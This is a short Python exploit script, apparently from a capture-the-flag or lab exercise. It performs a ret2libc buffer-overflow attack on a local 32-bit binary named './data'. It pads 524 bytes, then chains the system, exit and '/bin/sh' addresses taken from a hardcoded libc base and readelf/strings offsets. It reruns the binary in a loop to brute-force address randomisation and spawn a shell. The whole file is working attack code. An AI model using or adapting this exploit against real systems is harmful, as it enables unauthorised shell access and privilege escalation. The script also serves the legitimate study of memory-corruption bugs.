from struct import pack
from subprocess import call
import signal, sys

def def_handler(sig, frame):
    print("[!]Se tenso!!")
    sys.exit(-1)


signal.signal(signal.SIGINT, def_handler)

offset = 524
junk = b'A'*offset

libc_addr = 0xb7d81000 

#readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
#   150: 00033990    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
#   1537: 00041040    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

#strings -a -t x /lib/i386-linux-gnu/libc.so.6 |grep "/bin/sh"
# 188338 /bin/sh



system_addr_offset = 0x00041040
exit_addr_offset = 0x00033990
bin_sh_addr_offset = 0x00188338


system_addr = pack("<L", libc_addr + system_addr_offset)
exit_addr = pack("<L", libc_addr + exit_addr_offset )
bin_sh_addr = pack("<L", libc_addr + bin_sh_addr_offset)

payload = junk + system_addr + exit_addr + bin_sh_addr


while True:
    ret = call(["./data", "I",payload, "O"])
